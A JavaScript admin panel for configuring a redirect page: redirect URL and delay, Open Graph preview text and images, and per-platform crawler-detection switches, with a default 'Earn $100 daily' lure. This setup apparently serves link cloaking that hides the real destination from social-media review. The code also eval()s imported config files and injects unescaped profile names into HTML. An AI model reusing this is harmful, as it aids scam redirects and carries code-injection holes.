// Admin Panel JavaScript
class AdminPanel {
    constructor() {
        this.currentConfig = this.getDefaultConfig();
        this.init();
    }

    getDefaultConfig() {
        return {
            REDIRECT_URL: "https://www.google.com",
            OG_TITLE: "Earn $100 daily",
            OG_DESCRIPTION: "Check out this amazing offer and start earning today!",
            OG_IMAGE_URL: "https://i.imghippo.com/files/gbuB7452ddM.png",
            DISPLAY_IMAGE_URL: "https://i.imghippo.com/files/gbuB7452ddM.png",
            REDIRECT_DELAY_MS: 2000,
            REDIRECT_MESSAGE: "Redirecting you shortly...",
            PAGE_TITLE: "Redirecting...",
            OG_URL: "https://rajonbd1.github.io/bestone/",
            CRAWLER_DETECTION: {
                facebook: true,
                twitter: false,
                linkedin: false,
                google: false
            },
            CUSTOM_CSS: "",
            SECURITY: {
                httpsOnly: false,
                strictReferrer: false
            }
        };
    }

    init() {
        this.loadConfiguration();
        this.setupEventListeners();
        this.setupNavigation();
        this.loadProfiles();
        this.updateConfigPreview();
    }

    setupEventListeners() {
        // Save configuration
        document.getElementById('saveBtn').addEventListener('click', () => this.saveConfiguration());
        
        // Preview modal
        document.getElementById('previewBtn').addEventListener('click', () => this.showPreview());
        document.querySelector('.modal-close').addEventListener('click', () => this.hidePreview());
        
        // Profile management
        document.getElementById('saveProfileBtn').addEventListener('click', () => this.saveProfile());
        
        // Export/Import
        document.getElementById('exportConfigBtn').addEventListener('click', () => this.exportConfig());
        document.getElementById('exportJsonBtn').addEventListener('click', () => this.exportJson());
        document.getElementById('importFile').addEventListener('change', (e) => this.importConfig(e));
        
        // Real-time updates
        this.setupRealTimeUpdates();
        
        // Modal click outside to close
        document.getElementById('previewModal').addEventListener('click', (e) => {
            if (e.target.id === 'previewModal') {
                this.hidePreview();
            }
        });
    }

    setupNavigation() {
        const navLinks = document.querySelectorAll('.nav-link');
        const sections = document.querySelectorAll('.config-section');

        navLinks.forEach(link => {
            link.addEventListener('click', (e) => {
                e.preventDefault();
                
                // Remove active class from all links and sections
                navLinks.forEach(l => l.classList.remove('active'));
                sections.forEach(s => s.classList.remove('active'));
                
                // Add active class to clicked link
                link.classList.add('active');
                
                // Show corresponding section
                const sectionId = link.getAttribute('data-section');
                document.getElementById(sectionId).classList.add('active');
            });
        });
    }

    setupRealTimeUpdates() {
        const inputs = [
            'redirectUrl', 'redirectDelay', 'redirectMessage', 'pageTitle',
            'ogTitle', 'ogDescription', 'ogImageUrl', 'displayImageUrl', 'ogUrl',
            'detectFacebook', 'detectTwitter', 'detectLinkedIn', 'detectGoogle',
            'customCss', 'enableHttpsOnly', 'enableReferrerPolicy'
        ];

        inputs.forEach(inputId => {
            const element = document.getElementById(inputId);
            if (element) {
                element.addEventListener('input', () => {
                    this.updateConfigFromForm();
                    this.updateConfigPreview();
                });
                
                if (element.type === 'checkbox') {
                    element.addEventListener('change', () => {
                        this.updateConfigFromForm();
                        this.updateConfigPreview();
                    });
                }
            }
        });
    }

    loadConfiguration() {
        // Load from localStorage if available
        const saved = localStorage.getItem('redirectPageConfig');
        if (saved) {
            try {
                this.currentConfig = { ...this.getDefaultConfig(), ...JSON.parse(saved) };
            } catch (e) {
                console.error('Error loading saved configuration:', e);
            }
        }
        
        this.updateFormFromConfig();
    }

    updateFormFromConfig() {
        const config = this.currentConfig;
        
        // Basic settings
        document.getElementById('redirectUrl').value = config.REDIRECT_URL || '';
        document.getElementById('redirectDelay').value = (config.REDIRECT_DELAY_MS || 2000) / 1000;
        document.getElementById('redirectMessage').value = config.REDIRECT_MESSAGE || '';
        document.getElementById('pageTitle').value = config.PAGE_TITLE || '';
        
        // Social media settings
        document.getElementById('ogTitle').value = config.OG_TITLE || '';
        document.getElementById('ogDescription').value = config.OG_DESCRIPTION || '';
        document.getElementById('ogImageUrl').value = config.OG_IMAGE_URL || '';
        document.getElementById('displayImageUrl').value = config.DISPLAY_IMAGE_URL || '';
        document.getElementById('ogUrl').value = config.OG_URL || '';
        
        // Advanced settings
        if (config.CRAWLER_DETECTION) {
            document.getElementById('detectFacebook').checked = config.CRAWLER_DETECTION.facebook || false;
            document.getElementById('detectTwitter').checked = config.CRAWLER_DETECTION.twitter || false;
            document.getElementById('detectLinkedIn').checked = config.CRAWLER_DETECTION.linkedin || false;
            document.getElementById('detectGoogle').checked = config.CRAWLER_DETECTION.google || false;
        }
        
        document.getElementById('customCss').value = config.CUSTOM_CSS || '';
        
        if (config.SECURITY) {
            document.getElementById('enableHttpsOnly').checked = config.SECURITY.httpsOnly || false;
            document.getElementById('enableReferrerPolicy').checked = config.SECURITY.strictReferrer || false;
        }
    }

    updateConfigFromForm() {
        this.currentConfig = {
            REDIRECT_URL: document.getElementById('redirectUrl').value,
            REDIRECT_DELAY_MS: parseFloat(document.getElementById('redirectDelay').value) * 1000,
            REDIRECT_MESSAGE: document.getElementById('redirectMessage').value,
            PAGE_TITLE: document.getElementById('pageTitle').value,
            OG_TITLE: document.getElementById('ogTitle').value,
            OG_DESCRIPTION: document.getElementById('ogDescription').value,
            OG_IMAGE_URL: document.getElementById('ogImageUrl').value,
            DISPLAY_IMAGE_URL: document.getElementById('displayImageUrl').value,
            OG_URL: document.getElementById('ogUrl').value,
            CRAWLER_DETECTION: {
                facebook: document.getElementById('detectFacebook').checked,
                twitter: document.getElementById('detectTwitter').checked,
                linkedin: document.getElementById('detectLinkedIn').checked,
                google: document.getElementById('detectGoogle').checked
            },
            CUSTOM_CSS: document.getElementById('customCss').value,
            SECURITY: {
                httpsOnly: document.getElementById('enableHttpsOnly').checked,
                strictReferrer: document.getElementById('enableReferrerPolicy').checked
            }
        };
    }

    saveConfiguration() {
        this.updateConfigFromForm();
        
        // Validate configuration
        if (!this.validateConfig()) {
            return;
        }
        
        // Save to localStorage
        localStorage.setItem('redirectPageConfig', JSON.stringify(this.currentConfig));
        
        // Generate and save config.js file
        this.generateConfigFile();
        
        this.showMessage('Configuration saved successfully!', 'success');
    }

    validateConfig() {
        const config = this.currentConfig;
        
        if (!config.REDIRECT_URL) {
            this.showMessage('Redirect URL is required!', 'error');
            return false;
        }
        
        try {
            new URL(config.REDIRECT_URL);
        } catch (e) {
            this.showMessage('Invalid redirect URL format!', 'error');
            return false;
        }
        
        if (config.OG_IMAGE_URL) {
            try {
                new URL(config.OG_IMAGE_URL);
            } catch (e) {
                this.showMessage('Invalid social media image URL format!', 'error');
                return false;
            }
        }
        
        if (config.DISPLAY_IMAGE_URL) {
            try {
                new URL(config.DISPLAY_IMAGE_URL);
            } catch (e) {
                this.showMessage('Invalid display image URL format!', 'error');
                return false;
            }
        }
        
        return true;
    }

    generateConfigFile() {
        const config = this.currentConfig;
        const configContent = `// config.js - Generated by Admin Panel
// Last updated: ${new Date().toISOString()}

const CONFIG = {
    REDIRECT_URL: "${config.REDIRECT_URL}",
    OG_TITLE: "${config.OG_TITLE}",
    OG_DESCRIPTION: "${config.OG_DESCRIPTION}",
    OG_IMAGE_URL: "${config.OG_IMAGE_URL}",
    DISPLAY_IMAGE_URL: "${config.DISPLAY_IMAGE_URL}",
    REDIRECT_DELAY_MS: ${config.REDIRECT_DELAY_MS},
    REDIRECT_MESSAGE: "${config.REDIRECT_MESSAGE}",
    PAGE_TITLE: "${config.PAGE_TITLE}",
    OG_URL: "${config.OG_URL}",
    CRAWLER_DETECTION: ${JSON.stringify(config.CRAWLER_DETECTION, null, 4)},
    CUSTOM_CSS: \`${config.CUSTOM_CSS}\`,
    SECURITY: ${JSON.stringify(config.SECURITY, null, 4)}
};`;

        // Save to localStorage for download
        localStorage.setItem('generatedConfig', configContent);
        
        return configContent;
    }

    updateConfigPreview() {
        const configContent = this.generateConfigFile();
        document.getElementById('configPreview').value = configContent;
    }

    showPreview() {
        const config = this.currentConfig;
        
        // Update preview content
        document.getElementById('previewTitle').textContent = config.OG_TITLE || 'No title';
        document.getElementById('previewDescription').textContent = config.OG_DESCRIPTION || 'No description';
        document.getElementById('previewUrl').textContent = config.OG_URL || 'No URL';
        
        const previewImg = document.getElementById('previewImg');
        if (config.OG_IMAGE_URL) {
            previewImg.src = config.OG_IMAGE_URL;
            previewImg.style.display = 'block';
        } else {
            previewImg.style.display = 'none';
        }
        
        // Show modal
        document.getElementById('previewModal').style.display = 'block';
    }

    hidePreview() {
        document.getElementById('previewModal').style.display = 'none';
    }

    saveProfile() {
        const profileName = document.getElementById('profileName').value.trim();
        if (!profileName) {
            this.showMessage('Please enter a profile name!', 'error');
            return;
        }
        
        this.updateConfigFromForm();
        
        const profiles = JSON.parse(localStorage.getItem('redirectPageProfiles') || '{}');
        profiles[profileName] = {
            config: this.currentConfig,
            created: new Date().toISOString()
        };
        
        localStorage.setItem('redirectPageProfiles', JSON.stringify(profiles));
        document.getElementById('profileName').value = '';
        
        this.loadProfiles();
        this.showMessage(`Profile "${profileName}" saved successfully!`, 'success');
    }

    loadProfiles() {
        const profiles = JSON.parse(localStorage.getItem('redirectPageProfiles') || '{}');
        const profilesList = document.getElementById('profilesList');
        
        if (Object.keys(profiles).length === 0) {
            profilesList.innerHTML = '<p style="padding: 1rem; text-align: center; color: #666;">No saved profiles</p>';
            return;
        }
        
        profilesList.innerHTML = Object.entries(profiles).map(([name, data]) => `
            <div class="profile-item">
                <div class="profile-info">
                    <div class="profile-name">${name}</div>
                    <div class="profile-date">Created: ${new Date(data.created).toLocaleDateString()}</div>
                </div>
                <div class="profile-actions">
                    <button class="btn btn-secondary" onclick="adminPanel.loadProfile('${name}')">
                        <i class="fas fa-upload"></i> Load
                    </button>
                    <button class="btn btn-danger" onclick="adminPanel.deleteProfile('${name}')">
                        <i class="fas fa-trash"></i> Delete
                    </button>
                </div>
            </div>
        `).join('');
    }

    loadProfile(profileName) {
        const profiles = JSON.parse(localStorage.getItem('redirectPageProfiles') || '{}');
        if (profiles[profileName]) {
            this.currentConfig = profiles[profileName].config;
            this.updateFormFromConfig();
            this.updateConfigPreview();
            this.showMessage(`Profile "${profileName}" loaded successfully!`, 'success');
        }
    }

    deleteProfile(profileName) {
        if (confirm(`Are you sure you want to delete the profile "${profileName}"?`)) {
            const profiles = JSON.parse(localStorage.getItem('redirectPageProfiles') || '{}');
            delete profiles[profileName];
            localStorage.setItem('redirectPageProfiles', JSON.stringify(profiles));
            this.loadProfiles();
            this.showMessage(`Profile "${profileName}" deleted successfully!`, 'success');
        }
    }

    exportConfig() {
        const configContent = this.generateConfigFile();
        this.downloadFile('config.js', configContent, 'text/javascript');
    }

    exportJson() {
        const jsonContent = JSON.stringify(this.currentConfig, null, 2);
        this.downloadFile('redirect-config.json', jsonContent, 'application/json');
    }

    downloadFile(filename, content, mimeType) {
        const blob = new Blob([content], { type: mimeType });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = filename;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
    }

    importConfig(event) {
        const file = event.target.files[0];
        if (!file) return;
        
        const reader = new FileReader();
        reader.onload = (e) => {
            try {
                let config;
                const content = e.target.result;
                
                if (file.name.endsWith('.json')) {
                    config = JSON.parse(content);
                } else if (file.name.endsWith('.js')) {
                    // Extract CONFIG object from JavaScript file
                    const configMatch = content.match(/const CONFIG = ({[\s\S]*?});/);
                    if (configMatch) {
                        config = eval('(' + configMatch[1] + ')');
                    } else {
                        throw new Error('Invalid config.js format');
                    }
                } else {
                    throw new Error('Unsupported file format');
                }
                
                this.currentConfig = { ...this.getDefaultConfig(), ...config };
                this.updateFormFromConfig();
                this.updateConfigPreview();
                this.showMessage('Configuration imported successfully!', 'success');
                
            } catch (error) {
                this.showMessage('Error importing configuration: ' + error.message, 'error');
            }
        };
        
        reader.readAsText(file);
    }

    showMessage(message, type) {
        // Remove existing messages
        const existingMessages = document.querySelectorAll('.message');
        existingMessages.forEach(msg => msg.remove());
        
        // Create new message
        const messageDiv = document.createElement('div');
        messageDiv.className = `message ${type} show`;
        messageDiv.textContent = message;
        
        // Insert at the top of main content
        const mainContent = document.querySelector('.main-content');
        mainContent.insertBefore(messageDiv, mainContent.firstChild);
        
        // Auto-hide after 5 seconds
        setTimeout(() => {
            messageDiv.classList.remove('show');
            setTimeout(() => messageDiv.remove(), 300);
        }, 5000);
    }
}

// Initialize admin panel when DOM is loaded
document.addEventListener('DOMContentLoaded', () => {
    window.adminPanel = new AdminPanel();
});
